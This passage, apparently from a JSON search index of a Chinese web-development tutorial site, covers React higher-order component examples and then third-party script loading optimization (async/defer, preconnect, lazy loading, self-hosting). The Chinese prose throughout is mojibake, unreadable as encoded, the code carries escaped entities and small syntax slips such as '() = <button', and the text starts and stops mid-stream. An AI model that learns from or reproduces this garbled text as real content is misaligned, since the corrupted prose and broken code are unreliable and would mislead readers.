6 7 8 9 10 11 12 13 14 15 16 17 18  //withHover.js import React, { useState } from \u0026#34;react\u0026#34;; export default function withHover(Element) { return props =\u0026gt; { const [hovering, setHover] = useState(false); return ( \u0026lt;Element {...props} hovering={hovering} onMouseEnter={() =\u0026gt; setHover(true)} onMouseLeave={() =\u0026gt; setHover(false)} /\u0026gt; ); }; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //withLoader.js import React, { useEffect, useState } from \u0026#34;react\u0026#34;; export default function withLoader(Element, url) { return props =\u0026gt; { const [data, setData] = useState(null); useEffect(() =\u0026gt; { fetch(url) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; setData(data)); }, []); if (!data) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } return \u0026lt;Element {...props} data={data} /\u0026gt;; }; }   DogImages å…ƒç´ ç°åœ¨åŒ…å«ä» withHover å’Œ withLoader ä¼ é€’çš„æ‰€æœ‰é“å…·ã€‚ ç°åœ¨å¯ä»¥æœ‰æ¡ä»¶åœ°æ¸²æŸ“æ‚¬åœï¼ æ–‡æœ¬æ¡†ï¼ŒåŸºäºæ‚¬åœé“å…·çš„å€¼æ˜¯çœŸè¿˜æ˜¯å‡ã€‚\nä¸€ä¸ªè‘—åçš„ç”¨äºç»„æˆ HOC çš„åº“æ˜¯ recomposeã€‚ ç”±äº HOC åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¯ä»¥è¢« React Hooks æ›¿ä»£ï¼Œå› æ­¤ä¸å†ç»´æŠ¤ recompose åº“ï¼Œå› æ­¤æœ¬æ–‡ä¸ä¼šæ¶‰åŠã€‚\n\rä¼˜ç‚¹ ä½¿ç”¨é«˜é˜¶ç»„ä»¶æ¨¡å¼å…è®¸æˆ‘ä»¬å°†æ‰€æœ‰è¦é‡ç”¨çš„é€»è¾‘æ”¾åœ¨ä¸€ä¸ªåœ°æ–¹ã€‚ é€šè¿‡ä¸€éåˆä¸€éåœ°å¤åˆ¶ä»£ç ï¼Œè¿™é™ä½äº†åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­æ„å¤–ä¼ æ’­é”™è¯¯çš„é£é™©ï¼Œæ¯æ¬¡éƒ½å¯èƒ½å¼•å…¥æ–°çš„é”™è¯¯ã€‚ é€šè¿‡å°†é€»è¾‘å…¨éƒ¨æ”¾åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿æŒæˆ‘ä»¬çš„ä»£ç  DRY å¹¶è½»æ¾å®æ–½å…³æ³¨ç‚¹åˆ†ç¦»ã€‚\n\rç¼ºç‚¹ HOC å¯ä»¥ä¼ é€’ç»™å…ƒç´ çš„ prop çš„åç§°å¯èƒ½ä¼šå¯¼è‡´å‘½åå†²çªã€‚\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = { padding: \u0026#39;0.2rem\u0026#39;, margin: \u0026#39;1rem\u0026#39; }\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button style={{ color: \u0026#39;red\u0026#39; }}\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst StyledButton = withStyles(Button) åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ withStyles HOC å‘æˆ‘ä»¬ä¼ é€’ç»™å®ƒçš„å…ƒç´ æ·»åŠ äº†ä¸€ä¸ªåä¸º style çš„é“å…·ã€‚ ä½†æ˜¯ï¼ŒButton ç»„ä»¶å·²ç»æœ‰ä¸€ä¸ªåä¸º style çš„ propï¼Œå®ƒå°†è¢«è¦†ç›–ï¼ é€šè¿‡é‡å‘½åé“å…·æˆ–åˆå¹¶é“å…·ï¼Œç¡®ä¿ HOC å¯ä»¥å¤„ç†æ„å¤–çš„åç§°å†²çªã€‚\nfunction withStyles(Component) {\rreturn props =\u0026gt; {\rconst style = {\rpadding: \u0026#39;0.2rem\u0026#39;,\rmargin: \u0026#39;1rem\u0026#39;,\r...props.style\r}\rreturn \u0026lt;Component style={style} {...props} /\u0026gt;\r}\r}\rconst Button = () = \u0026lt;button style={{ color: \u0026#39;red\u0026#39; }}\u0026gt;Click me!\u0026lt;/button\u0026gt;\rconst StyledButton = withStyles(Button) å½“ä½¿ç”¨å¤šä¸ªç»„åˆçš„ HOC å°† props ä¼ é€’ç»™åŒ…è£¹åœ¨å…¶ä¸­çš„å…ƒç´ æ—¶ï¼Œå¯èƒ½å¾ˆéš¾ç¡®å®šå“ªä¸ª HOC è´Ÿè´£å“ªä¸ª propã€‚ è¿™å¯èƒ½ä¼šé˜»ç¢è°ƒè¯•å’Œè½»æ¾æ‰©å±•åº”ç”¨ç¨‹åºã€‚\n","description":"å°†å¯é‡ç”¨é€»è¾‘ä½œä¸ºé“å…·ä¼ é€’ç»™æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ç»„ä»¶","id":126,"section":"react-patterns","tags":null,"title":"HOC æ¨¡å¼ï¼ˆXï¼‰","uri":"https://codthing.github.io/react-patterns/design-patterns/hoc-pattern/"},{"content":"ç¬¬ä¸‰æ–¹èµ„æºå¯èƒ½ä¼šé™ä½ç½‘ç«™é€Ÿåº¦ï¼Œå¹¶ä¸”å¯èƒ½æ˜¯ä¼˜åŒ–çš„æŒ‘æˆ˜ã€‚\nå¯ä»¥éµå¾ªæŸäº›æœ€ä½³å®è·µæ¥æœ‰æ•ˆåœ°åŠ è½½æˆ–å»¶è¿Ÿä¸åŒç±»å‹çš„ç¬¬ä¸‰æ–¹ã€‚\nè¿˜å¯ä»¥ä½¿ç”¨æ¡†æ¶çº§ç»„ä»¶ï¼Œä¾‹å¦‚ Next.js è„šæœ¬ç»„ä»¶ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæ¨¡æ¿ï¼Œç”¨äºæ„å»ºåŠ è½½ç¬¬ä¸‰æ–¹è„šæœ¬çš„â€œä½•æ—¶â€å’Œâ€œå¦‚ä½•â€ã€‚\næˆ–è€…ï¼Œåƒ Partytown è¿™æ ·çš„å®éªŒæ€§æƒ³æ³•å¯èƒ½ä¼šå¼•èµ·äººä»¬çš„å…´è¶£ã€‚\nå¾ˆéš¾æ‰¾åˆ°ä¸€ä¸ªåœ¨å­¤å²›ä¸­è¿ä½œçš„ç°ä»£ç½‘ç«™ã€‚\nå¤§å¤šæ•°ç«™ç‚¹å…±å­˜å¹¶ä¾èµ–ç½‘ç»œä¸Šçš„å…¶ä»–å‡ ä¸ªæ¥æºæ¥è·å–æ•°æ®ã€åŠŸèƒ½ã€å†…å®¹ç­‰ã€‚\nä½äºå¦ä¸€ä¸ªåŸŸå¹¶ç”±æ‚¨çš„ç«™ç‚¹ä½¿ç”¨çš„ä»»ä½•èµ„æºéƒ½æ˜¯æ‚¨ç«™ç‚¹çš„ç¬¬ä¸‰æ–¹ (3P) èµ„æºã€‚\nç«™ç‚¹ä¸­åŒ…å«çš„å…¸å‹ç¬¬ä¸‰æ–¹èµ„æºåŒ…æ‹¬\n  åµŒå…¥åœ°å›¾ã€è§†é¢‘ã€ç¤¾äº¤åª’ä½“å’ŒèŠå¤©æœåŠ¡\n  å¹¿å‘Š\n  åˆ†æç»„ä»¶å’Œæ ‡ç­¾ç®¡ç†å™¨\n  A/B æµ‹è¯•å’Œä¸ªæ€§åŒ–è„šæœ¬\n  æä¾›å³ç”¨å‹è¾…åŠ©åŠŸèƒ½çš„å®ç”¨ç¨‹åºåº“ï¼Œä¾‹å¦‚ç”¨äºæ•°æ®å¯è§†åŒ–æˆ–åŠ¨ç”»çš„åŠŸèƒ½ã€‚\n  reCAPTCHA æˆ– CAPTCHA ç”¨äºæœºå™¨äººæ£€æµ‹ã€‚\n  å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¥é›†æˆå…¶ä»–åŠŸèƒ½ï¼Œ\nä¸ºå†…å®¹å¢åŠ ä»·å€¼æˆ–å‡å°‘ä»å¤´å¼€å§‹æ„å»ºç½‘ç«™æ‰€æ¶‰åŠçš„ä¸€äº›è‹¦å·®äº‹ã€‚\næ ¹æ® 2021 å¹´ç½‘ç»œå¹´é‰´æŠ¥å‘Šï¼Œç½‘ç»œä¸Šè¶…è¿‡ 94% çš„é¡µé¢ä½¿ç”¨ç¬¬ä¸‰æ–¹â€”â€”å›¾åƒå’Œ JavaScript æ˜¯ç¬¬ä¸‰æ–¹å†…å®¹çš„æœ€é‡è¦è´¡çŒ®è€…ã€‚\nä»¥ä¸‹æ˜¯æŒ‰å†…å®¹ç±»å‹å’Œç±»åˆ«å¯¹ç¬¬ä¸‰æ–¹è¯·æ±‚è¿›è¡Œçš„æœ‰ç”¨ç»†åˆ†ï¼š\nè™½ç„¶ç¬¬ä¸‰æ–¹èµ„æºå¯ä»¥é€šè¿‡æœ‰ä»·å€¼çš„åŠŸèƒ½ä¸°å¯Œæ‚¨çš„ç½‘ç«™ï¼Œä½†å¦‚æœå‡ºç°ä»¥ä¸‹æƒ…å†µï¼Œå®ƒä»¬ä¹Ÿä¼šå‡æ…¢é€Ÿåº¦ï¼š\n  å¯¹äºæ¯ä¸ªæ‰€éœ€çš„èµ„æºï¼Œå®ƒä»¬éƒ½ä¼šå¯¼è‡´åˆ°ç¬¬ä¸‰æ–¹åŸŸçš„é¢å¤–å¾€è¿”ã€‚\n  å®ƒä»¬å¤§é‡ä½¿ç”¨ JavaScriptï¼ˆå½±å“ä¸‹è½½å’Œæ‰§è¡Œæ—¶é—´ï¼‰æˆ–ç”±äºæœªä¼˜åŒ–çš„å›¾åƒ/è§†é¢‘è€Œä½“ç§¯åºå¤§ã€‚\n  ä¸ªåˆ«ç½‘ç«™æ‰€æœ‰è€…æ— æ³•å½±å“å®æ–½ï¼Œä»–ä»¬çš„è¡Œä¸ºå¯èƒ½æ— æ³•é¢„æµ‹ã€‚\n  å®ƒä»¬å¯ä»¥é˜»æ­¢é¡µé¢ä¸Šå…¶ä»–å…³é”®èµ„æºçš„å‘ˆç°å¹¶å½±å“ Core Web Vitals (CWV)ã€‚\n  å°½ç®¡å­˜åœ¨è¿™äº›é—®é¢˜ï¼Œç¬¬ä¸‰æ–¹å¯èƒ½å¯¹ä¸šåŠ¡è‡³å…³é‡è¦ã€‚\nå¦‚æœä¸èƒ½å–æ¶ˆ 3Pï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æœ€å¥½çš„äº‹æƒ…å°±æ˜¯ä¼˜åŒ–å®ƒä»¬ä»¥å‡å°‘æ€§èƒ½å½±å“ - è¿™å°±æ˜¯æœ¬èŠ‚ä¸­ä»‹ç»çš„å†…å®¹ã€‚\nåŒ…å«äº†ä¸€äº›é€‚ç”¨äºä¸åŒç±»å‹ç¬¬ä¸‰æ–¹è„šæœ¬çš„ç­–ç•¥å’Œæœ€ä½³å®è·µã€‚\nNext.js Script ç»„ä»¶åŒ…å«è®¸å¤šè¿™äº›æœ€ä½³å®è·µï¼Œå¯ä»¥åœ¨æœ¬æ–‡çš„ååŠéƒ¨åˆ†äº†è§£å®ƒã€‚\né¦–å…ˆçœ‹çœ‹å¦‚ä½•ç¡®å®šç¬¬ä¸‰æ–¹è„šæœ¬æ˜¯å¦ä¼šæŸå®³é¡µé¢çš„æ€§èƒ½ã€‚\nè¯„ä¼° 3P èµ„æºçš„æ€§èƒ½å½±å“ å¯ä»¥ä½¿ç”¨å¤šç§æŠ€æœ¯æ¥æŸ¥æ‰¾ç¬¬ä¸‰æ–¹ä»£ç å¦‚ä½•å½±å“ç½‘ç«™ã€‚\nä»¥ä¸‹ Lighthouse å®¡è®¡æœ‰åŠ©äºè¯†åˆ«å½±å“ CWV çš„ç¼“æ…¢ç¬¬ä¸‰æ–¹è„šæœ¬ã€‚\n  å‡å°‘ç¬¬ä¸‰æ–¹ä»£ç å¯¹é˜»å¡ä¸»çº¿ç¨‹çš„è„šæœ¬çš„å½±å“ã€‚\n  å‡å°‘éœ€è¦å¾ˆé•¿æ—¶é—´æ‰§è¡Œçš„è„šæœ¬çš„ JavaScript æ‰§è¡Œæ—¶é—´\n  é¿å…å¤§å‹è„šæœ¬çš„å·¨å¤§ç½‘ç»œè´Ÿè½½\n    ä½¿ç”¨ WebPageTest (WPT) ç€‘å¸ƒå›¾æ¥è¯†åˆ«ç¬¬ä¸‰æ–¹é˜»æ­¢è„šæœ¬æˆ– WPT å¹¶æ’æ¯”è¾ƒæ¥è¡¡é‡ 3rd æ–¹æ ‡ç­¾çš„å½±å“ã€‚\n  Bundlephobia ç­‰ç½‘ç«™æœ‰åŠ©äºè¯„ä¼°å°†å¯ç”¨ npm åŒ…æ·»åŠ åˆ°æ‚¨çš„åŒ…ä¸­çš„æˆæœ¬ã€‚ è¿˜å¯ä»¥ä½¿ç”¨ npm åŒ…æœç´¢æŸ¥æ‰¾ä»»ä½•åŒ…ä¸­åŒ…å«çš„å¤§å°å’Œä¾èµ–é¡¹ã€‚\n  æœ‰äº†è¯†åˆ«æœ‰é—®é¢˜çš„ç¬¬ä¸‰æ–¹ä»£ç çš„èƒŒæ™¯ï¼Œè®©æˆ‘ä»¬æ¢ç´¢ä¼˜åŒ–å®ƒçš„æ–¹æ³•ã€‚\n\rä¼˜åŒ–ç­–ç•¥ ç”±äºç¬¬ä¸‰æ–¹ä»£ç ä¸å—æ‚¨çš„æ§åˆ¶ï¼Œå› æ­¤æ‚¨æ— æ³•ç›´æ¥ä¼˜åŒ–åº“ã€‚ è¿™ç»™æ‚¨ç•™ä¸‹äº†ä¸¤ä¸ªé€‰æ‹©ã€‚\n  æ›¿æ¢æˆ–ç§»é™¤ï¼š\nå¦‚æœç¬¬ä¸‰æ–¹è„šæœ¬æä¾›çš„å€¼ä¸å…¶æ€§èƒ½æˆæœ¬ä¸æˆæ­£æ¯”ï¼Œè¯·è€ƒè™‘å°†å…¶ç§»é™¤ã€‚ è¿˜å¯ä»¥è¯„ä¼°å…¶ä»–è½»é‡çº§ä½†æä¾›ç±»ä¼¼åŠŸèƒ½çš„æ›¿ä»£æ–¹æ¡ˆã€‚ åœ¨æœ¬æ¡ˆä¾‹ç ”ç©¶ä¸­ï¼Œå°†è®¨è®ºå¦‚ä½•é€šè¿‡åˆ‡æ¢å…·æœ‰æ›´è½»é‡çº§æ›¿ä»£å“å’Œç±»ä¼¼åŠŸèƒ½çš„è½¯ä»¶åŒ…æ¥æé«˜ç”µå½±åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚\n  ä¼˜åŒ–åŠ è½½é¡ºåºï¼š\nåŠ è½½è¿‡ç¨‹æ¶‰åŠåœ¨æµè§ˆå™¨ä¸­åŠ è½½å¤šä¸ªç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹èµ„æºã€‚ è¦è®¾è®¡æœ€ä½³åŠ è½½ç­–ç•¥ï¼Œéœ€è¦è€ƒè™‘ä¸ºä¸åŒèµ„æºåˆ†é…çš„æµè§ˆå™¨ä¼˜å…ˆçº§ã€å®ƒä»¬åœ¨é¡µé¢ä¸Šçš„ä½ç½®ä»¥åŠæ¯ä¸ªèµ„æºåœ¨ç½‘é¡µä¸­çš„ä»·å€¼ã€‚ æˆ‘ä»¬ä¸º React/Next.js åº”ç”¨ç¨‹åºæå‡ºäº†æœ€ä½³åŠ è½½é¡ºåºã€‚ æˆ‘ä»¬ç°åœ¨å°†çœ‹åˆ°è¿™å¦‚ä½•é€‚ç”¨äºå„ç§ç¬¬ä¸‰æ–¹èµ„æºä»¥åŠå¯ä»¥é‡‡å–å“ªäº›æ­¥éª¤ä»¥æœ€ä½³æ–¹å¼åŠ è½½å®ƒä»¬ã€‚\n  é«˜æ•ˆåŠ è½½ 3P è„šæœ¬ ä»¥ä¸‹æ˜¯ç»è¿‡æ—¶é—´è€ƒéªŒçš„æœ€ä½³å®è·µï¼Œå¦‚æœä½¿ç”¨å¾—å½“ï¼Œå®ƒä»¬å¯ä»¥å‡å°‘ç¬¬ä¸‰æ–¹èµ„æºçš„æ€§èƒ½å½±å“ã€‚\nä½¿ç”¨ async æˆ– defer æ¥é˜²æ­¢è„šæœ¬é˜»æ­¢å…¶ä»–å†…å®¹ã€‚\né€‚ç”¨äºï¼šéå…³é”®è„šæœ¬ï¼ˆæ ‡ç­¾ç®¡ç†å™¨ã€åˆ†æï¼‰\nJavaScript ä¸‹è½½å’Œæ‰§è¡Œé»˜è®¤æ˜¯åŒæ­¥çš„ï¼Œå¯ä»¥é˜»æ­¢ä¸»çº¿ç¨‹ä¸Šçš„ HTML è§£æå™¨å’Œ DOM æ„å»ºã€‚\nåœ¨ \u0026lt;script\u0026gt; å…ƒç´ ä¸­ä½¿ç”¨ async æˆ– defer å±æ€§å‘Šè¯‰æµè§ˆå™¨å¼‚æ­¥ä¸‹è½½è„šæœ¬ã€‚\nå¯ä»¥ä½¿ç”¨è¿™äº›æ¥ä¸‹è½½å…³é”®æ¸²æŸ“è·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œä¸» UI ç»„ä»¶ï¼‰ä¸éœ€è¦çš„ä»»ä½•è„šæœ¬\ndeferï¼šè„šæœ¬åœ¨è§£æå™¨æ‰§è¡Œæ—¶å¹¶è¡Œè·å–ï¼Œè„šæœ¬æ‰§è¡Œå»¶è¿Ÿåˆ°è§£æå®Œæˆã€‚ Defer åº”è¯¥æ˜¯å»¶è¿Ÿæ‰§è¡Œç›´åˆ° DOM æ„å»ºä¹‹åçš„é»˜è®¤é€‰æ‹©ã€‚\nasyncï¼šè„šæœ¬åœ¨è§£ææ—¶å¹¶è¡Œè·å–ï¼Œä½†åœ¨é˜»å¡è§£æå™¨æ—¶ä¼šåœ¨å¯ç”¨æ—¶ç«‹å³æ‰§è¡Œã€‚\nå¯¹äºæœ‰ä¾èµ–çš„æ¨¡å—è„šæœ¬ï¼Œè„šæœ¬åŠå…¶æ‰€æœ‰ä¾èµ–éƒ½åœ¨ defer é˜Ÿåˆ—ä¸­æ‰§è¡Œã€‚\nå¯¹éœ€è¦åœ¨åŠ è½½è¿‡ç¨‹ä¸­æ›´æ—©è¿è¡Œçš„è„šæœ¬ä½¿ç”¨ asyncã€‚\nä¾‹å¦‚ï¼Œå¯èƒ½å¸Œæœ›åœ¨ä¸ä¸¢å¤±ä»»ä½•æ—©æœŸé¡µé¢åŠ è½½æ•°æ®çš„æƒ…å†µä¸‹å°½æ—©æ‰§è¡Œç‰¹å®šçš„åˆ†æè„šæœ¬ã€‚\n\u0026lt;script src=\u0026#34;https://example.com/deferthis.js\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#34;https://example.com/asyncthis.js\u0026#34; async\u0026gt;\u0026lt;/script\u0026gt;  developers.google.com\n è¿™é‡Œå€¼å¾—ä¸€æçš„ä¸€ä¸ªè­¦å‘Šæ˜¯ async å’Œ defer é™ä½äº†æµè§ˆå™¨åˆ†é…çš„èµ„æºä¼˜å…ˆçº§ï¼Œå¯¼è‡´å…¶åŠ è½½æ—¶é—´æ˜¾ç€å»¶è¿Ÿã€‚ ä¼˜å…ˆçº§æç¤ºçš„æ–°åŠŸèƒ½å¯ä»¥å¸®åŠ©è§£å†³æ­¤é—®é¢˜ã€‚\nä½¿ç”¨èµ„æºæç¤ºå»ºç«‹ä¸æ‰€éœ€æ¥æºçš„æ—©æœŸè¿æ¥ é€‚ç”¨äºï¼šæ¥è‡ªç¬¬ä¸‰æ–¹ CDN çš„å…³é”®è„šæœ¬ã€å­—ä½“ã€CSSã€å›¾åƒ\nç”±äºæ¯ä¸ªç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯èƒ½éœ€è¦ DNS æŸ¥æ‰¾ã€é‡å®šå‘å’Œå¤šæ¬¡å¾€è¿”ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹æºå¯èƒ½ä¼šå¾ˆæ…¢ã€‚\nèµ„æºæç¤º dns-prefetch å’Œ preconnect é€šè¿‡åœ¨ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸå¯åŠ¨è¿æ¥æ¥å¸®åŠ©å‡å°‘æ­¤è®¾ç½®æ‰€éœ€çš„æ—¶é—´ã€‚\nåŒ…å«ä¸åŸŸå¯¹åº”çš„ dns-prefetch èµ„æºæç¤ºå°†æå‰æ‰§è¡Œ DNS æŸ¥æ‰¾ï¼Œä»è€Œå‡å°‘ä¸ dns æŸ¥æ‰¾ç›¸å…³çš„å»¶è¿Ÿã€‚ å¯ä»¥å°†å…¶ä¸æœ€å…³é”®èµ„æºçš„é¢„è¿æ¥é…å¯¹ã€‚\né™¤äº† DNS æŸ¥æ‰¾ä¹‹å¤–ï¼Œé¢„è¿æ¥è¿˜é€šè¿‡æ‰§è¡Œ TCP å¾€è¿”å’Œå¤„ç† TLS åå•†æ¥å¯åŠ¨ä¸ç¬¬ä¸‰æ–¹åŸŸçš„è¿æ¥ã€‚\n\u0026lt;head\u0026gt;\r\u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;http://example.com\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;dns-prefetch\u0026#34; href=\u0026#34;http://example.com\u0026#34;\u0026gt;\r\u0026lt;/head\u0026gt; å»¶è¿ŸåŠ è½½ 3P èµ„æº é€‚ç”¨äºï¼šYouTubeã€åœ°å›¾ã€å¹¿å‘Šå’Œç¤¾äº¤åª’ä½“ç­‰åµŒå…¥\nç¬¬ä¸‰æ–¹åµŒå…¥ï¼ˆä¾‹å¦‚ç”¨äºç¤¾äº¤åª’ä½“æè¦ã€å¹¿å‘Šã€YouTube è§†é¢‘å’Œåœ°å›¾çš„åµŒå…¥ï¼‰å¯èƒ½ä¼šé™ä½ç½‘é¡µé€Ÿåº¦ã€‚\nä½†æ˜¯ï¼Œæ‰€æœ‰æ­¤ç±»åµŒå…¥åœ¨é¡µé¢åŠ è½½æ—¶å¯èƒ½å¯¹ç”¨æˆ·ä¸å¯è§ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·å‘ä¸‹æ»šåŠ¨åˆ°å®ƒä»¬æ—¶å¯èƒ½ä¼šå»¶è¿ŸåŠ è½½ã€‚\nå¯ä»¥æ ¹æ®æ‰€éœ€çš„æµè§ˆå™¨æ”¯æŒä½¿ç”¨ä¸åŒçš„å»¶è¿ŸåŠ è½½æ–¹æ³•ã€‚\n  loading å±æ€§å¯ä»¥ä¸å›¾åƒå’Œ iframe ä¸€èµ·ä½¿ç”¨ï¼Œè¿™äº›å›¾åƒå’Œ iframe é€šå¸¸ç”¨äºåŠ è½½ç¬¬ä¸‰æ–¹åµŒå…¥ï¼Œä¾‹å¦‚ YouTube æˆ– Google åœ°å›¾çš„åµŒå…¥ã€‚\n  ä½¿ç”¨ IntersectionObserver API çš„è‡ªå®šä¹‰æ£€æµ‹è¢«è§‚å¯Ÿå…ƒç´ ä½•æ—¶è¿›å…¥æˆ–é€€å‡ºæµè§ˆå™¨çš„è§†å£ã€‚\n  Lazy-sizes - ä¸€ä¸ªæµè¡Œçš„ JavaScript åº“ï¼Œå¯ä¸ºå®ç°å»¶è¿ŸåŠ è½½ã€‚\n  å»¶è¿ŸåŠ è½½åµŒå…¥çš„ä¸€ç§å˜ä½“ä½¿ç”¨åœ¨é¡µé¢åŠ è½½æ—¶å‘ç”¨æˆ·æ˜¾ç¤ºçš„é™æ€æˆ–åŠ¨æ€å¤–è§‚ã€‚\nå¯ä»¥ä½¿ç”¨å®é™…åµŒå…¥çš„é™æ€å›¾åƒä»£æ›¿åœ°å›¾åµŒå…¥æ¥æ˜¾ç¤ºåœ°å›¾åµŒå…¥ä¸Šçš„ç‰¹å®šåŒºåŸŸã€‚\næˆ–è€…ï¼Œä½¿ç”¨çœ‹èµ·æ¥åƒåµŒå…¥ä½†ä»…åœ¨ç”¨æˆ·å•å‡»æˆ–ä¸ä¹‹äº¤äº’æ—¶åŠ è½½çš„å¤–è§‚ã€‚\næµè¡Œçš„åµŒå…¥å®ç°å¤–è§‚çš„ä¸€äº›æ–¹æ³•åŒ…æ‹¬ç”¨äºåœ°å›¾çš„ Map Static APIã€ç”¨äº Twitter åµŒå…¥çš„ Tweetpikã€ç”¨äº YouTube çš„ lite-youtube-embedã€ç”¨äºèŠå¤©å°éƒ¨ä»¶çš„ React-live-chat-loaderã€‚\næœ‰å…³è¿™äº›æŠ€æœ¯çš„å…¨é¢è®¨è®ºå¯åœ¨æ­¤å¤„è·å¾—ã€‚\nå…³äºå»¶è¿ŸåŠ è½½å’Œå¤–å¢™çš„ä¸€äº›æ³¨æ„äº‹é¡¹\n  YouTube å¤–è§‚åœ¨ iOS å’Œ Safari ä¸Šçš„ macOS 11+ ä¸Šçš„è¡Œä¸ºç•¥æœ‰ä¸åŒã€‚ ç¬¬ä¸€æ¬¡ç‚¹å‡»/ç‚¹å‡»åŠ è½½å®é™…çš„è§†é¢‘åµŒå…¥ã€‚ ç”¨æˆ·å¿…é¡»å†æ¬¡ç‚¹å‡»æ‰èƒ½æ’­æ”¾è§†é¢‘ã€‚\n  å¦‚æœæœªæŒ‡å®šåµŒå…¥çš„å¤§å°ï¼Œå»¶è¿ŸåŠ è½½ä¼šå¯¼è‡´å¸ƒå±€åç§»å¹¶å½±å“ç”¨æˆ·ä½“éªŒã€‚ ä¸ºäº†é˜²æ­¢å¸ƒå±€åç§»ï¼Œåº”è¯¥ä¸ºæ‰€æœ‰å»¶è¿ŸåŠ è½½çš„åµŒå…¥æˆ–å…¶å®¹å™¨å…ƒç´ æŒ‡å®šå¤§å°ã€‚\n  è‡ªæ‰˜ç®¡ 3P è„šæœ¬ä»¥é˜²æ­¢å¾€è¿” é€‚ç”¨äºï¼šJavaScript æ–‡ä»¶ã€å­—ä½“\n  å°½ç®¡ preconnect æˆ– dns-prefetch å…è®¸å°½æ—©å¯åŠ¨ä¸ç¬¬ä¸‰æ–¹æºçš„è¿æ¥ï¼Œä½†è¿™äº›è¿æ¥ä»ç„¶æ˜¯å¿…éœ€çš„ã€‚æ­¤å¤–ï¼Œå¯¹äºç¬¬ä¸‰æ–¹æ¥æºï¼Œéœ€è¦ä¾èµ–ä»–ä»¬çš„ç¼“å­˜ç­–ç•¥ï¼Œè¿™å¯èƒ½ä¸æ˜¯æœ€ä½³çš„ã€‚\n  åœ¨åŒä¸€æºä¸Šè‡ªæ‰˜ç®¡è„šæœ¬çš„å‰¯æœ¬å¯æ›´å¥½åœ°æ§åˆ¶ç”¨äºè„šæœ¬çš„åŠ è½½å’Œç¼“å­˜è¿‡ç¨‹ã€‚è‡ªæ‰˜ç®¡å‡å°‘äº† DNS æŸ¥æ‰¾æ‰€éœ€çš„æ—¶é—´ï¼Œå¹¶å…è®¸æ‚¨ä½¿ç”¨ HTTP ç¼“å­˜æ”¹è¿›è„šæœ¬çš„ç¼“å­˜ç­–ç•¥ã€‚è¿˜å¯ä»¥ä½¿ç”¨ HTTP/2 æœåŠ¡å™¨æ¨é€æ¥æ¨é€æ‚¨çŸ¥é“ç”¨æˆ·éœ€è¦çš„è„šæœ¬ã€‚è‡ªæ‰˜ç®¡ç¬¬ä¸‰æ–¹è„šæœ¬çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯ Casper.comï¼Œå®ƒé€šè¿‡ Optimizely æä¾›çš„è‡ªæ‰˜ç®¡ç¬¬ä¸‰æ–¹è„šæœ¬å°†å…¶ä¸»é¡µçš„å¼€å§‹æ¸²æŸ“æ—¶é—´ç¼©çŸ­äº† 1.7 ç§’ã€‚\n  å¯¹äºç¬¬ä¸‰æ–¹è„šæœ¬çš„è‡ªæ‰˜ç®¡å‰¯æœ¬ï¼Œå¿…é¡»ç¡®ä¿æ ¹æ®å¯¹åŸå§‹è„šæœ¬çš„æ›´æ”¹å®šæœŸæ›´æ–°å‰¯æœ¬ã€‚å¦‚æœæ²¡æœ‰æ›´æ–°ï¼Œè„šæœ¬å¯èƒ½ä¼šè¿‡æ—¶ï¼Œç¼ºå°‘ä¸ä¾èµ–é¡¹å¯¹åº”çš„é‡è¦ä¿®å¤æˆ–æ›´æ”¹ã€‚åœ¨æœåŠ¡å™¨ä¸Šè‡ªæ‰˜ç®¡è€Œä¸æ˜¯ CDN ä¹Ÿä¼šé˜»æ­¢æ‚¨åˆ©ç”¨ CDN é‡‡ç”¨çš„è¾¹ç¼˜ç¼“å­˜æœºåˆ¶ã€‚\nå°½å¯èƒ½ä½¿ç”¨ Service Worker ç¼“å­˜è„šæœ¬ é€‚ç”¨äºï¼šJavaScript æ–‡ä»¶ã€å­—ä½“\nå¯¹äºé¢‘ç¹æ›´æ”¹çš„è„šæœ¬ï¼Œè‡ªæ‰˜ç®¡å¯èƒ½ä¸æ˜¯ä¸€ä¸ªé€‰é¡¹ã€‚ å¯ä»¥ä½¿ç”¨ Service Worker æ¥æ”¹è¿›æ­¤ç±»ç¬¬ä¸‰æ–¹è„šæœ¬çš„ç¼“å­˜ï¼ŒåŒæ—¶è¿˜å¯ä»¥åˆ©ç”¨ CDN è¾¹ç¼˜ç¼“å­˜ã€‚ è¿™ç§æŠ€æœ¯å¯ä»¥æ›´å¥½åœ°æ§åˆ¶é€šè¿‡ç½‘ç»œé‡æ–°è·å–çš„é¢‘ç‡ã€‚å¯ä»¥ä¸é¢„è¿æ¥ç»“åˆä½¿ç”¨ï¼Œä»¥è¿›ä¸€æ­¥é™ä½è·å–æ“ä½œçš„ç½‘ç»œæˆæœ¬ã€‚ è¿˜å¯ä»¥åŠ è½½èµ„æºï¼Œä»¥ä¾¿å°†éå¿…è¦çš„ç¬¬ä¸‰æ–¹è„šæœ¬çš„è¯·æ±‚æ¨è¿Ÿåˆ°é¡µé¢åˆ°è¾¾å…³é”®ç”¨æˆ·æ—¶åˆ»ã€‚\néµå¾ªç†æƒ³çš„åŠ 